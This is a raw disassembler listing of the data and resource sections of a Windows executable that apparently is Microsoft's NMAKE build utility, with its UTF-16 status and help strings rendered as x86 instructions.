  437e01:	arpl   WORD PTR [ecx+0x6c],sp
  437e04:	ins    BYTE PTR es:[edi],dx
  437e05:	outs   dx,DWORD PTR ds:[esi]
  437e06:	arpl   WORD PTR [edi+0x63],bx
  437e09:	jb     0x437e7f
  437e0b:	add    BYTE PTR [ecx+eax*1+0x6c645f5f],bl
  437e12:	ins    BYTE PTR es:[edi],dx
  437e13:	outs   dx,DWORD PTR ds:[esi]
  437e14:	outs   dx,BYTE PTR ds:[esi]
  437e15:	gs js  0x437e81
  437e18:	je     0x437e1a
  437e1a:	adc    al,BYTE PTR [edi+ebx*2]
  437e1d:	outs   dx,DWORD PTR ds:[esi]
  437e1e:	outs   dx,BYTE PTR ds:[esi]
  437e1f:	gs js  0x437e8b
  437e22:	je     0x437e24
  437e24:	test   BYTE PTR [edx],0x5f
  437e27:	imul   ebp,DWORD PTR [esi+0x76],0x5f656b6f
  437e2e:	ja     0x437e91
  437e30:	je     0x437ea5
  437e32:	outs   dx,DWORD PTR ds:[esi]
  437e33:	outs   dx,BYTE PTR ds:[esi]
  437e34:	add    BYTE PTR [eax],al
  437e36:	das    
  437e37:	add    bl,BYTE PTR [edi+0x63]
  437e3a:	outs   dx,DWORD PTR ds:[esi]
  437e3b:	outs   dx,BYTE PTR ds:[esi]
  437e3c:	je     0x437eb0
  437e3e:	outs   dx,DWORD PTR ds:[esi]
  437e3f:	ins    BYTE PTR es:[edi],dx
  437e40:	data16 jo 0x437ea2
  437e43:	jae    0x437e45
  437e45:	add    BYTE PTR [eax+0x2],ah
  437e48:	pop    edi
  437e49:	gs js  0x437eaf
  437e4c:	gs jo  0x437ec3
  437e4f:	pop    edi
  437e50:	push   0x6c646e61
  437e55:	gs jb  0x437e8c
  437e58:	pop    edi
  437e59:	arpl   WORD PTR [edi+0x6d],bp
  437e5c:	ins    DWORD PTR es:[edi],dx
  437e5d:	outs   dx,DWORD PTR ds:[esi]
  437e5e:	outs   dx,BYTE PTR ds:[esi]
  437e5f:	add    BYTE PTR [ecx+eax*1],bh
  437e62:	inc    ebp
  437e63:	outs   dx,BYTE PTR ds:[esi]
  437e64:	arpl   WORD PTR [edi+0x64],bp
  437e67:	gs push eax
  437e69:	outs   dx,DWORD PTR ds:[esi]
  437e6a:	imul   ebp,DWORD PTR [esi+0x74],0x83007265
  437e71:	add    ecx,DWORD PTR [ecx+0x73]
  437e74:	inc    esp
  437e75:	bound  esi,QWORD PTR gs:[ebp+0x67]
  437e79:	addr16 gs jb 0x437ecd
  437e7d:	jb     0x437ee4
  437e7f:	jae    0x437ee6
  437e81:	outs   dx,BYTE PTR ds:[esi]
  437e82:	je     0x437e84
  437e84:	mov    BYTE PTR [ebx],al
  437e86:	dec    ecx
  437e87:	jae    0x437ed9
  437e89:	jb     0x437efa
  437e8b:	arpl   WORD PTR [ebp+0x73],sp
  437e8e:	jae    0x437eff
  437e90:	jb     0x437ed8
  437e92:	gs popa 
  437e94:	je     0x437f0b
  437e96:	jb     0x437efd
  437e98:	push   eax
  437e99:	jb     0x437f00
  437e9b:	jae    0x437f02
  437e9d:	outs   dx,BYTE PTR ds:[esi]
  437e9e:	je     0x437ea0
  437ea0:	cmp    al,0x4
  437ea2:	push   ecx
  437ea3:	jne    0x437f0a
  437ea5:	jb     0x437f20
  437ea7:	push   eax
  437ea8:	gs jb  0x437f11
  437eab:	outs   dx,DWORD PTR ds:[esi]
  437eac:	jb     0x437f1b
  437eae:	popa   
  437eaf:	outs   dx,BYTE PTR ds:[esi]
  437eb0:	arpl   WORD PTR [ebp+0x43],sp
  437eb3:	outs   dx,DWORD PTR ds:[esi]
  437eb4:	jne    0x437f24
  437eb6:	je     0x437f1d
  437eb8:	jb     0x437eba
  437eba:	adc    DWORD PTR [ebx],eax
  437ebc:	inc    edi
  437ebd:	gs je  0x437f14
  437ec0:	imul   esp,DWORD PTR [ebx+0x6b],0x6e756f43
  437ec7:	je     0x437eff
  437ec9:	xor    al,0x0
  437ecb:	add    BYTE PTR [edi],dl
  437ecd:	add    DWORD PTR [ebp+eiz*2+0x63],eax
  437ed1:	outs   dx,DWORD PTR ds:[esi]
  437ed2:	fs gs push eax
  437ed5:	outs   dx,DWORD PTR ds:[esi]
  437ed6:	imul   ebp,DWORD PTR [esi+0x74],0x18007265
  437edd:	push   es
  437ede:	ins    DWORD PTR es:[edi],dx
  437edf:	gs ins DWORD PTR es:[edi],dx
  437ee1:	arpl   WORD PTR [eax+0x79],si
  437ee4:	add    BYTE PTR [eax],al
  437ee6:	sbb    al,0x6
  437ee8:	ins    DWORD PTR es:[edi],dx
  437ee9:	gs ins DWORD PTR es:[edi],dx
  437eeb:	jae    0x437f52
  437eed:	je     0x437eef
	...

Disassembly of section .rsrc:

00438000 <.rsrc>:
	...
  438008:	add    al,0x0
  43800a:	add    BYTE PTR [eax],al
  43800c:	add    BYTE PTR [eax],al
  43800e:	add    eax,DWORD PTR [eax]
  438010:	push   es
  438011:	add    BYTE PTR [eax],al
  438013:	add    BYTE PTR [eax],ch
  438015:	add    BYTE PTR [eax],al
  438017:	adc    BYTE PTR [eax],0x0
  43801a:	add    BYTE PTR [eax],al
  43801c:	mov    al,ds:0x18800000
  438021:	add    BYTE PTR [eax],al
  438023:	add    BYTE PTR [eax+0x800000],bh
  438029:	add    BYTE PTR [eax],al
  43802b:	add    BYTE PTR [eax],al
  43802d:	add    BYTE PTR [eax],al
  43802f:	add    BYTE PTR [eax+eax*1],al
  438032:	add    BYTE PTR [eax],al
  438034:	add    BYTE PTR [eax],al
  438036:	or     eax,0x100
  43803b:	add    al,dl
  43803d:	add    BYTE PTR [eax],al
  43803f:	add    BYTE PTR [edx],0x0
  438042:	add    BYTE PTR [eax],al
  438044:	call   0x7c38049
  438049:	add    BYTE PTR [eax],al
  43804b:	add    BYTE PTR [eax],al
  43804d:	add    DWORD PTR [eax],eax
  43804f:	or     BYTE PTR [eax],0x0
  438052:	add    BYTE PTR [eax],al
  438054:	sbb    BYTE PTR [ecx],al
  438056:	add    BYTE PTR [eax+0x3f],al
  43805c:	xor    BYTE PTR [ecx],al
  43805e:	add    BYTE PTR [eax+0x40],al
  438064:	dec    eax
  438065:	add    DWORD PTR [eax],eax
  438067:	add    BYTE PTR [ecx+0x0],0x0
  43806b:	add    BYTE PTR [eax+0x1],ah
  43806e:	add    BYTE PTR [eax+0x42],al
  438074:	js     0x438077
  438076:	add    BYTE PTR [eax+0x43],al
  43807c:	nop
  43807d:	add    DWORD PTR [eax],eax
  43807f:	add    BYTE PTR [eax+eax*1+0x0],0x0
  438084:	test   al,0x1
  438086:	add    BYTE PTR [eax+0x45],al
  43808c:	rol    BYTE PTR [ecx],0x0
  43808f:	cmp    BYTE PTR [esi+0x0],0x0
  438093:	add    al,bl
  438095:	add    DWORD PTR [eax],eax
  438097:	cmp    bl,0x0
  43809a:	add    BYTE PTR [eax],al
  43809c:	lock add DWORD PTR [eax],eax
  43809f:	add    BYTE PTR [eax],0x0
  4380a2:	add    BYTE PTR [eax],al
  4380a4:	add    BYTE PTR [eax],al
  4380a6:	add    BYTE PTR [eax],al
  4380a8:	add    al,0x0
  4380aa:	add    BYTE PTR [eax],al
  4380ac:	add    BYTE PTR [eax],al
  4380ae:	add    DWORD PTR [eax],eax
  4380b0:	add    DWORD PTR [eax],eax
  4380b2:	add    BYTE PTR [eax],al
  4380b4:	or     BYTE PTR [edx],al
  4380b6:	add    BYTE PTR [eax+0x0],al
  4380bc:	add    BYTE PTR [eax],al
  4380be:	add    BYTE PTR [eax],al
  4380c0:	add    al,0x0
  4380c2:	add    BYTE PTR [eax],al
  4380c4:	add    BYTE PTR [eax],al
  4380c6:	add    DWORD PTR [eax],eax
  4380c8:	add    DWORD PTR [eax],eax
  4380ca:	add    BYTE PTR [eax],al
  4380cc:	and    BYTE PTR [edx],al
  4380ce:	add    BYTE PTR [eax+0x0],al
  4380d4:	add    BYTE PTR [eax],al
  4380d6:	add    BYTE PTR [eax],al
  4380d8:	add    al,0x0
  4380da:	add    BYTE PTR [eax],al
  4380dc:	add    BYTE PTR [eax],al
  4380de:	add    DWORD PTR [eax],eax
  4380e0:	or     DWORD PTR [eax+eax*1],eax
  4380e3:	add    BYTE PTR [eax],bh
  4380e5:	add    al,BYTE PTR [eax]
	...
  4380ef:	add    BYTE PTR [eax+eax*1],al
  4380f2:	add    BYTE PTR [eax],al
  4380f4:	add    BYTE PTR [eax],al
  4380f6:	add    DWORD PTR [eax],eax
  4380f8:	or     DWORD PTR [eax+eax*1],eax
  4380fb:	add    BYTE PTR [eax+0x2],cl
	...
  438106:	add    BYTE PTR [eax],al
  438108:	add    al,0x0
  43810a:	add    BYTE PTR [eax],al
  43810c:	add    BYTE PTR [eax],al
  43810e:	add    DWORD PTR [eax],eax
  438110:	or     DWORD PTR [eax+eax*1],eax
  438113:	add    BYTE PTR [eax+0x2],bl
	...
  43811e:	add    BYTE PTR [eax],al
  438120:	add    al,0x0
  438122:	add    BYTE PTR [eax],al
  438124:	add    BYTE PTR [eax],al
  438126:	add    DWORD PTR [eax],eax
  438128:	or     DWORD PTR [eax+eax*1],eax
  43812b:	add    BYTE PTR [eax+0x2],ch
	...
  438136:	add    BYTE PTR [eax],al
  438138:	add    al,0x0
  43813a:	add    BYTE PTR [eax],al
  43813c:	add    BYTE PTR [eax],al
  43813e:	add    DWORD PTR [eax],eax
  438140:	or     DWORD PTR [eax+eax*1],eax
  438143:	add    BYTE PTR [eax+0x2],bh
	...
  43814e:	add    BYTE PTR [eax],al
  438150:	add    al,0x0
  438152:	add    BYTE PTR [eax],al
  438154:	add    BYTE PTR [eax],al
  438156:	add    DWORD PTR [eax],eax
  438158:	or     DWORD PTR [eax+eax*1],eax
  43815b:	add    BYTE PTR [eax+0x2],cl
  438161:	add    BYTE PTR [eax],al
  438163:	add    BYTE PTR [eax],al
  438165:	add    BYTE PTR [eax],al
  438167:	add    BYTE PTR [eax+eax*1],al
  43816a:	add    BYTE PTR [eax],al
  43816c:	add    BYTE PTR [eax],al
  43816e:	add    DWORD PTR [eax],eax
  438170:	or     DWORD PTR [eax+eax*1],eax
  438173:	add    BYTE PTR [eax+0x2],bl
  438179:	add    BYTE PTR [eax],al
  43817b:	add    BYTE PTR [eax],al
  43817d:	add    BYTE PTR [eax],al
  43817f:	add    BYTE PTR [eax+eax*1],al
  438182:	add    BYTE PTR [eax],al
  438184:	add    BYTE PTR [eax],al
  438186:	add    DWORD PTR [eax],eax
  438188:	or     DWORD PTR [eax+eax*1],eax
  43818b:	add    BYTE PTR [eax+0x2],ch
  438191:	add    BYTE PTR [eax],al
  438193:	add    BYTE PTR [eax],al
  438195:	add    BYTE PTR [eax],al
  438197:	add    BYTE PTR [eax+eax*1],al
  43819a:	add    BYTE PTR [eax],al
  43819c:	add    BYTE PTR [eax],al
  43819e:	add    DWORD PTR [eax],eax
  4381a0:	or     DWORD PTR [eax+eax*1],eax
  4381a3:	add    BYTE PTR [eax+0x2],bh
  4381a9:	add    BYTE PTR [eax],al
  4381ab:	add    BYTE PTR [eax],al
  4381ad:	add    BYTE PTR [eax],al
  4381af:	add    BYTE PTR [eax+eax*1],al
  4381b2:	add    BYTE PTR [eax],al
  4381b4:	add    BYTE PTR [eax],al
  4381b6:	add    DWORD PTR [eax],eax
  4381b8:	or     DWORD PTR [eax+eax*1],eax
  4381bb:	add    al,cl
  4381bd:	add    al,BYTE PTR [eax]
	...
  4381c7:	add    BYTE PTR [eax+eax*1],al
  4381ca:	add    BYTE PTR [eax],al
  4381cc:	add    BYTE PTR [eax],al
  4381ce:	add    DWORD PTR [eax],eax
  4381d0:	or     DWORD PTR [eax+eax*1],eax
  4381d3:	add    al,bl
  4381d5:	add    al,BYTE PTR [eax]
	...
  4381df:	add    BYTE PTR [eax+eax*1],al
  4381e2:	add    BYTE PTR [eax],al
  4381e4:	add    BYTE PTR [eax],al
  4381e6:	add    DWORD PTR [eax],eax
  4381e8:	or     DWORD PTR [eax+eax*1],eax
  4381eb:	add    al,ch
  4381ed:	add    al,BYTE PTR [eax]
	...
  4381f7:	add    BYTE PTR [eax+eax*1],al
  4381fa:	add    BYTE PTR [eax],al
  4381fc:	add    BYTE PTR [eax],al
  4381fe:	add    DWORD PTR [eax],eax
  438200:	or     DWORD PTR [eax+eax*1],eax
  438203:	add    al,bh
  438205:	add    al,BYTE PTR [eax]
	...
  43820f:	add    BYTE PTR [eax+eax*1],al
  438212:	add    BYTE PTR [eax],al
  438214:	add    BYTE PTR [eax],al
  438216:	add    DWORD PTR [eax],eax
  438218:	or     DWORD PTR [eax+eax*1],eax
  43821b:	add    BYTE PTR [eax],cl
  43821d:	add    eax,DWORD PTR [eax]
	...
  438227:	add    BYTE PTR [eax+eax*1],al
  43822a:	add    BYTE PTR [eax],al
  43822c:	add    BYTE PTR [eax],al
  43822e:	add    DWORD PTR [eax],eax
  438230:	or     DWORD PTR [eax+eax*1],eax
  438233:	add    BYTE PTR [eax],bl
  438235:	add    eax,DWORD PTR [eax]
  438237:	add    BYTE PTR [eax],ch
  438239:	add    DWORD PTR [ebx],0x0
  43823c:	mov    eax,0xe4000001
  438241:	add    al,0x0
  438243:	add    BYTE PTR [eax],al
  438245:	add    BYTE PTR [eax],al
  438247:	add    al,ah
  438249:	test   BYTE PTR [ebx],al
  43824b:	add    BYTE PTR [ecx+eax*1+0x0],al
  43824f:	add    ah,ah
  438251:	add    al,0x0
  438253:	add    BYTE PTR [eax],al
  438255:	add    BYTE PTR [eax],al
  438257:	add    BYTE PTR [esi+eax*4],ah
  43825a:	add    eax,DWORD PTR [eax]
  43825c:	pop    esp
  43825d:	add    eax,DWORD PTR [eax]
  43825f:	add    ah,ah
  438261:	add    al,0x0
  438263:	add    BYTE PTR [eax],al
  438265:	add    BYTE PTR [eax],al
  438267:	add    BYTE PTR [eax-0x7dfffc77],al
  43826d:	add    eax,DWORD PTR [eax]
  43826f:	add    ah,ah
  438271:	add    al,0x0
  438273:	add    BYTE PTR [eax],al
  438275:	add    BYTE PTR [eax],al
  438277:	add    BYTE PTR [ecx*4+0x2d80003],al
  43827e:	add    BYTE PTR [eax],al
  438280:	in     al,0x4
  438282:	add    BYTE PTR [eax],al
  438284:	add    BYTE PTR [eax],al
  438286:	add    BYTE PTR [eax],al
  438288:	fmul   QWORD PTR [edi+0x2240003]
  43828e:	add    BYTE PTR [eax],al
  438290:	in     al,0x4
  438292:	add    BYTE PTR [eax],al
  438294:	add    BYTE PTR [eax],al
  438296:	add    BYTE PTR [eax],al
  438298:	add    BYTE PTR [edx+0x2c40003],dl
  43829e:	add    BYTE PTR [eax],al
  4382a0:	in     al,0x4
  4382a2:	add    BYTE PTR [eax],al
  4382a4:	add    BYTE PTR [eax],al
  4382a6:	add    BYTE PTR [eax],al
  4382a8:	les    edx,FWORD PTR [ebx+eax*1+0x38200]
  4382af:	add    ah,ah
  4382b1:	add    al,0x0
  4382b3:	add    BYTE PTR [eax],al
  4382b5:	add    BYTE PTR [eax],al
  4382b7:	add    BYTE PTR [eax-0x68],cl
  4382ba:	add    eax,DWORD PTR [eax]
  4382bc:	push   esi
  4382bd:	add    eax,DWORD PTR [eax]
  4382bf:	add    ah,ah
  4382c1:	add    al,0x0
  4382c3:	add    BYTE PTR [eax],al
  4382c5:	add    BYTE PTR [eax],al
  4382c7:	add    BYTE PTR [eax-0x3ffffc65],ah
  4382cd:	add    eax,DWORD PTR [eax]
  4382cf:	add    ah,ah
  4382d1:	add    al,0x0
  4382d3:	add    BYTE PTR [eax],al
  4382d5:	add    BYTE PTR [eax],al
  4382d7:	add    BYTE PTR [eax-0x61],ah
  4382da:	add    eax,DWORD PTR [eax]
  4382dc:	mov    BYTE PTR [ebx],al
  4382de:	add    BYTE PTR [eax],al
  4382e0:	in     al,0x4
  4382e2:	add    BYTE PTR [eax],al
  4382e4:	add    BYTE PTR [eax],al
  4382e6:	add    BYTE PTR [eax],al
  4382e8:	call   0x7643868f
  4382ed:	add    BYTE PTR [eax],al
  4382ef:	add    ah,ah
  4382f1:	add    al,0x0
  4382f3:	add    BYTE PTR [eax],al
  4382f5:	add    BYTE PTR [eax],al
  4382f7:	add    BYTE PTR [eax-0x5d],ah
  4382fa:	add    eax,DWORD PTR [eax]
  4382fc:	int3   
  4382fd:	add    al,0x0
  4382ff:	add    ah,ah
  438301:	add    al,0x0
  438303:	add    BYTE PTR [eax],al
  438305:	add    BYTE PTR [eax],al
  438307:	add    BYTE PTR [eax+ebp*4],ch
  43830a:	add    eax,DWORD PTR [eax]
  43830c:	nop
  43830d:	add    eax,DWORD PTR [eax]
  43830f:	add    ah,ah
  438311:	add    al,0x0
  438313:	add    BYTE PTR [eax],al
  438315:	add    BYTE PTR [eax],al
  438317:	add    BYTE PTR [ebx+ebp*4+0x1970003],bh
  43831e:	add    BYTE PTR [eax],al
  438320:	in     al,0x4
	...
  43832a:	push   ss
  43832b:	add    BYTE PTR [esi+0x0],ah
  43832e:	imul   eax,DWORD PTR [eax],0x65006c
  438334:	and    BYTE PTR [eax],al
  438336:	and    eax,0x20007300
  43833b:	add    BYTE PTR [eax+eax*1+0x6f],ah
  43833f:	add    BYTE PTR [ebp+0x0],ah
  438342:	jae    0x438344
  438344:	outs   dx,BYTE PTR ds:[esi]
  438345:	add    BYTE PTR [edi],ah
  438347:	add    BYTE PTR [eax+eax*1+0x20],dh
  43834b:	add    BYTE PTR [ebp+0x0],ah
  43834e:	js     0x438350
  438350:	imul   eax,DWORD PTR [eax],0x740073
  438356:	add    BYTE PTR [eax],al
  438358:	adc    eax,DWORD PTR [eax]
  43835a:	daa    
  43835b:	add    BYTE PTR ds:0x27007300,ah
  438361:	add    BYTE PTR [eax],ah
  438363:	add    BYTE PTR [ecx+0x0],ch
  438366:	jae    0x438368
  438368:	and    BYTE PTR [eax],al
  43836a:	jne    0x43836c
  43836c:	jo     0x43836e
  43836e:	sub    eax,0x6f007400
  438373:	add    BYTE PTR ds:0x61006400,ch
  438379:	add    BYTE PTR [eax+eax*1+0x65],dh
  43837d:	add    BYTE PTR [eax],al
  43837f:	add    BYTE PTR [eax+eax*1],dl
  438382:	sub    al,BYTE PTR [eax]
  438384:	sub    al,BYTE PTR [eax]
  438386:	and    BYTE PTR [eax],al
  438388:	and    eax,0x20007300
  43838d:	add    BYTE PTR [esi+0x0],ch
  438390:	add    BYTE PTR gs:[edi+0x0],dh
  438394:	add    BYTE PTR gs:[edx+0x0],dh
  438398:	and    BYTE PTR [eax],al
  43839a:	je     0x43839c
  43839c:	push   0x6e006100
  4383a1:	add    BYTE PTR [eax],ah
  4383a3:	add    BYTE PTR ds:0x7300,ah
  4383a9:	add    BYTE PTR [eax+eax*1],cl
  4383ac:	and    eax,0x20007300
  4383b1:	add    BYTE PTR ds:0x20007300,ah
  4383b7:	add    BYTE PTR ds:0x63002a00,ah
  4383bd:	add    BYTE PTR ds:0x7300,ah
  4383c3:	add    BYTE PTR [edx],cl
  4383c5:	add    BYTE PTR [ecx],cl
  4383c7:	add    BYTE PTR [eax+eax*1+0x6f],dh
  4383cb:	add    BYTE PTR [ebp+0x0],dh
  4383ce:	arpl   WORD PTR [eax],ax
  4383d0:	push   0x25002000
  4383d5:	add    BYTE PTR [ebx+0x0],dh
  4383d8:	add    BYTE PTR [eax],al
  4383da:	sbb    al,0x0
  4383dc:	and    eax,0x63002a00
  4383e1:	add    BYTE PTR ds:0x20007300,ah
  4383e7:	add    BYTE PTR [eax+eax*1+0x61],dh
  4383eb:	add    BYTE PTR [edx+0x0],dh
  4383ee:	add    BYTE PTR [di+0x0],ah
  4383f2:	je     0x4383f4
  4383f4:	and    BYTE PTR [eax],al
  4383f6:	add    BYTE PTR fs:[edi+0x0],ch
  4383fa:	add    BYTE PTR gs:[ebx+0x0],dh
  4383fe:	and    BYTE PTR [eax],al
  438400:	outs   dx,BYTE PTR ds:[esi]
  438401:	add    BYTE PTR [edi+0x0],ch
  438404:	je     0x438406
  438406:	and    BYTE PTR [eax],al
  438408:	add    BYTE PTR gs:[eax+0x0],bh
  43840c:	imul   eax,DWORD PTR [eax],0x740073
  438412:	add    BYTE PTR [eax],al
  438414:	adc    eax,DWORD PTR [eax]
  438416:	or     al,BYTE PTR [eax]
  438418:	dec    ecx
  438419:	add    BYTE PTR [esi+0x0],cl
  43841c:	inc    esi
  43841d:	add    BYTE PTR [ebp+0x0],al
  438420:	push   edx
  438421:	add    BYTE PTR [ebp+0x0],al
  438424:	dec    esi
  438425:	add    BYTE PTR [ebx+0x0],al
  438428:	inc    ebp
  438429:	add    BYTE PTR [eax],ah
  43842b:	add    BYTE PTR [edx+0x0],dl
  43842e:	push   ebp
  43842f:	add    BYTE PTR [eax+eax*1+0x45],cl
  438433:	add    BYTE PTR [ebx+0x0],dl
  438436:	cmp    al,BYTE PTR [eax]
  438438:	or     al,BYTE PTR [eax]
  43843a:	add    BYTE PTR [eax],al
  43843c:	or     al,BYTE PTR [eax]
  43843e:	or     al,BYTE PTR [eax]
  438440:	dec    ebp
  438441:	add    BYTE PTR [ecx+0x0],al
  438444:	inc    ebx
  438445:	add    BYTE PTR [edx+0x0],dl
  438448:	dec    edi
  438449:	add    BYTE PTR [ebx+0x0],dl
  43844c:	cmp    al,BYTE PTR [eax]
  43844e:	or     al,BYTE PTR [eax]
  438450:	add    BYTE PTR [eax],al
  438452:	or     eax,DWORD PTR [eax]
  438454:	or     al,BYTE PTR [eax]
  438456:	push   esp
  438457:	add    BYTE PTR [ecx+0x0],al
  43845a:	push   edx
  43845b:	add    BYTE PTR [edi+0x0],al
  43845e:	inc    ebp
  43845f:	add    BYTE PTR [eax+eax*1+0x53],dl
  438463:	add    BYTE PTR [edx],bh
  438465:	add    BYTE PTR [edx],cl
  438467:	add    BYTE PTR [eax],al
  438469:	add    BYTE PTR ds:0x9000a00,cl
  43846f:	add    BYTE PTR [ebx+0x0],ah
  438472:	outs   dx,DWORD PTR ds:[esi]
  438473:	add    BYTE PTR [ebp+0x0],ch
  438476:	ins    DWORD PTR es:[edi],dx
  438477:	add    BYTE PTR [ecx+0x0],ah
  43847a:	outs   dx,BYTE PTR ds:[esi]
  43847b:	add    BYTE PTR [eax+eax*1+0x73],ah
  43847f:	add    BYTE PTR [edx],bh
  438481:	add    BYTE PTR [ecx],cl
  438483:	add    BYTE PTR [eax],al
  438485:	add    BYTE PTR [edx],cl
  438487:	add    BYTE PTR [edx],cl
  438489:	add    BYTE PTR [ecx],cl
  43848b:	add    BYTE PTR [esi+0x0],ah
  43848e:	ins    BYTE PTR es:[edi],dx
  43848f:	add    BYTE PTR [ecx+0x0],ah
  438492:	add    BYTE PTR [bp+di+0x0],dh
  438496:	cmp    al,BYTE PTR [eax]
  438498:	or     DWORD PTR [eax],eax
  43849a:	add    BYTE PTR [eax],al
  43849c:	str    WORD PTR [edx]
  43849f:	add    BYTE PTR [ecx],cl
  4384a1:	add    BYTE PTR [eax+eax*1+0x65],ah
  4384a5:	add    BYTE PTR [eax+0x0],dh
  4384a8:	add    BYTE PTR gs:[esi+0x0],ch
  4384ac:	add    BYTE PTR fs:[ebp+0x0],ah
  4384b0:	outs   dx,BYTE PTR ds:[esi]
  4384b1:	add    BYTE PTR [eax+eax*1+0x73],dh
  4384b5:	add    BYTE PTR [edx],bh
  4384b7:	add    BYTE PTR [ecx],cl
  4384b9:	add    BYTE PTR [eax],al
  4384bb:	add    BYTE PTR [eax+eax*1],al
  4384be:	and    eax,0xa007300
  4384c3:	add    BYTE PTR [eax],al
  4384c5:	add    BYTE PTR [ebx],cl
  4384c7:	add    BYTE PTR ds:0x33003100,ah
  4384cd:	add    BYTE PTR [ebx+0x0],dh
  4384d0:	and    BYTE PTR [eax],al
  4384d2:	cmp    eax,0x25002000
  4384d7:	add    BYTE PTR [ebx+0x0],dh
  4384da:	or     al,BYTE PTR [eax]
	...
  4384e8:	or     al,0x0
  4384ea:	data16 add BYTE PTR [ecx+0x0],ah
  4384ee:	je     0x4384f0
  4384f0:	popa   
  4384f1:	add    BYTE PTR [eax+eax*1+0x20],ch
  4384f5:	add    BYTE PTR [ebp+0x0],ah
  4384f8:	jb     0x4384fa
  4384fa:	jb     0x4384fc
  4384fc:	outs   dx,DWORD PTR ds:[esi]
  4384fd:	add    BYTE PTR [edx+0x0],dh
  438500:	add    BYTE PTR [eax],al
  438502:	push   es
  438503:	add    BYTE PTR [ebp+0x0],ah
  438506:	jb     0x438508
  438508:	jb     0x43850a
  43850a:	outs   dx,DWORD PTR ds:[esi]
  43850b:	add    BYTE PTR [edx+0x0],dh
  43850e:	add    BYTE PTR [eax],al
  438510:	or     BYTE PTR [eax],al
  438512:	ja     0x438514
  438514:	popa   
  438515:	add    BYTE PTR [edx+0x0],dh
  438518:	outs   dx,BYTE PTR ds:[esi]
  438519:	add    BYTE PTR [ecx+0x0],ch
  43851c:	outs   dx,BYTE PTR ds:[esi]
  43851d:	add    BYTE PTR [edi+0x0],ah
  438520:	add    BYTE PTR [eax],al
  438522:	pop    es
  438523:	add    BYTE PTR [ebx+0x0],dl
  438526:	je     0x438528
  438528:	outs   dx,DWORD PTR ds:[esi]
  438529:	add    BYTE PTR [eax+0x0],dh
  43852c:	add    BYTE PTR cs:[edx],cl
  43852f:	add    BYTE PTR [eax],al
  438531:	add    BYTE PTR ds:0x69004d00,dh
  438537:	add    BYTE PTR [ebx+0x0],ah
  43853a:	jb     0x43853c
  43853c:	outs   dx,DWORD PTR ds:[esi]
  43853d:	add    BYTE PTR [ebx+0x0],dh
  438540:	outs   dx,DWORD PTR ds:[esi]
  438541:	add    BYTE PTR [esi+0x0],ah
  438544:	je     0x438546
  438546:	and    BYTE PTR [eax],al
  438548:	sub    BYTE PTR [eax],al
  43854a:	push   edx
  43854b:	add    BYTE PTR [ecx],ch
  43854d:	add    BYTE PTR [eax],ah
  43854f:	add    BYTE PTR [eax+0x0],dl
  438552:	jb     0x438554
  438554:	outs   dx,DWORD PTR ds:[esi]
  438555:	add    BYTE PTR [edi+0x0],ah
  438558:	jb     0x43855a
  43855a:	popa   
  43855b:	add    BYTE PTR [ebp+0x0],ch
  43855e:	and    BYTE PTR [eax],al
  438560:	dec    ebp
  438561:	add    BYTE PTR [ecx+0x0],ah
  438564:	imul   eax,DWORD PTR [eax],0x74006e
  43856a:	add    BYTE PTR gs:[esi+0x0],ch
  43856e:	popa   
  43856f:	add    BYTE PTR [esi+0x0],ch
  438572:	arpl   WORD PTR [eax],ax
  438574:	add    BYTE PTR gs:[eax],ah
  438577:	add    BYTE PTR [ebp+0x0],dl
  43857a:	je     0x43857c
  43857c:	imul   eax,DWORD PTR [eax],0x69006c
  438582:	je     0x438584
  438584:	jns    0x438586
  438586:	and    BYTE PTR [eax],al
  438588:	push   esi
  438589:	add    BYTE PTR [ebp+0x0],ah
  43858c:	jb     0x43858e
  43858e:	jae    0x438590
  438590:	imul   eax,DWORD PTR [eax],0x6e006f
  438596:	and    BYTE PTR [eax],al
  438598:	and    eax,0x7300
  43859d:	add    BYTE PTR [eax+eax*1],bh
  4385a0:	inc    ebx
  4385a1:	add    BYTE PTR [edi+0x0],ch
  4385a4:	jo     0x4385a6
  4385a6:	jns    0x4385a8
  4385a8:	jb     0x4385aa
  4385aa:	imul   eax,DWORD PTR [eax],0x680067
  4385b0:	je     0x4385b2
  4385b2:	and    BYTE PTR [eax],al
  4385b4:	sub    BYTE PTR [eax],al
  4385b6:	inc    ebx
  4385b7:	add    BYTE PTR [ecx],ch
  4385b9:	add    BYTE PTR [eax],ah
  4385bb:	add    BYTE PTR [ebp+0x0],cl
  4385be:	imul   eax,DWORD PTR [eax],0x720063
  4385c4:	outs   dx,DWORD PTR ds:[esi]
  4385c5:	add    BYTE PTR [ebx+0x0],dh
  4385c8:	outs   dx,DWORD PTR ds:[esi]
  4385c9:	add    BYTE PTR [esi+0x0],ah
  4385cc:	je     0x4385ce
  4385ce:	and    BYTE PTR [eax],al
  4385d0:	inc    ebx
  4385d1:	add    BYTE PTR [edi+0x0],ch
  4385d4:	jb     0x4385d6
  4385d6:	jo     0x4385d8
  4385d8:	outs   dx,DWORD PTR ds:[esi]
  4385d9:	add    BYTE PTR [edx+0x0],dh
  4385dc:	popa   
  4385dd:	add    BYTE PTR [eax+eax*1+0x69],dh
  4385e1:	add    BYTE PTR [edi+0x0],ch
  4385e4:	outs   dx,BYTE PTR ds:[esi]
  4385e5:	add    BYTE PTR [esi],ch
  4385e7:	add    BYTE PTR [eax],ah
  4385e9:	add    BYTE PTR [eax],ah
  4385eb:	add    BYTE PTR [ecx+0x0],al
  4385ee:	ins    BYTE PTR es:[edi],dx
  4385ef:	add    BYTE PTR [eax+eax*1+0x20],ch
  4385f3:	add    BYTE PTR [edx+0x0],dh
  4385f6:	imul   eax,DWORD PTR [eax],0x680067
  4385fc:	je     0x4385fe
  4385fe:	jae    0x438600
  438600:	and    BYTE PTR [eax],al
  438602:	jb     0x438604
  438604:	add    BYTE PTR gs:[ebx+0x0],dh
  438608:	add    BYTE PTR gs:[edx+0x0],dh
  43860c:	jbe    0x43860e
  43860e:	add    BYTE PTR gs:[eax+eax*1+0x2e],ah
  438613:	add    BYTE PTR [edx],cl
	...
  438629:	add    BYTE PTR [eax],al
  43862b:	add    BYTE PTR [eax],bl
  43862d:	add    BYTE PTR [ebp+0x0],dl
  438630:	jae    0x438632
  438632:	popa   
  438633:	add    BYTE PTR [edi+0x0],ah
  438636:	add    BYTE PTR gs:[edx],bh
  438639:	add    BYTE PTR [eax],ah
  43863b:	add    BYTE PTR [eax],ah
  43863d:	add    BYTE PTR ds:0x20007300,ah
  438643:	add    BYTE PTR [eax+0x0],al
  438646:	arpl   WORD PTR [eax],ax
  438648:	outs   dx,DWORD PTR ds:[esi]
